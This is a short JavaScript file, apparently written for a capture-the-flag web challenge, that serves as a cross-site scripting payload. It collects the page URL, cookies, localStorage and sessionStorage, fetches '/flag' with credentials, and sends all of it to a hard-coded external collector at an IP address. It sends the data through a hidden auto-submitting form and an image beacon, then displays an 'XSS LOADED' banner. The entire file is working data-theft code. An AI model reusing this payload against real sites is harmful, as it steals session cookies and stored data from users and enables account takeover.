// expl1.js
(function() {
    var COLLECTOR = 'http://109.234.39.144:8889/';
    
    // Собираем данные
    var data = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        origin: window.location.origin
    };
    
    // Пробуем прочитать флаг
    fetch('/flag', { credentials: 'include' })
        .then(r => r.ok ? r.text() : 'not found')
        .then(flag => {
            data.flag = flag;
            sendData(data);
        })
        .catch(() => sendData(data));
    
    function sendData(d) {
        // Отправляем через POST форму (работает всегда)
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = COLLECTOR;
        form.style.display = 'none';
        var input = document.createElement('input');
        input.name = 'data';
        input.value = JSON.stringify(d);
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
        
        // Также через Image
        new Image().src = COLLECTOR + '?data=' + encodeURIComponent(JSON.stringify(d));
    }
    
    // Индикатор на странице
    document.body.innerHTML += '<div style="position:fixed;top:0;left:0;background:#0f0;color:#000;padding:5px;z-index:99999;">🔥 XSS LOADED! Sending to collector...</div>';
})();
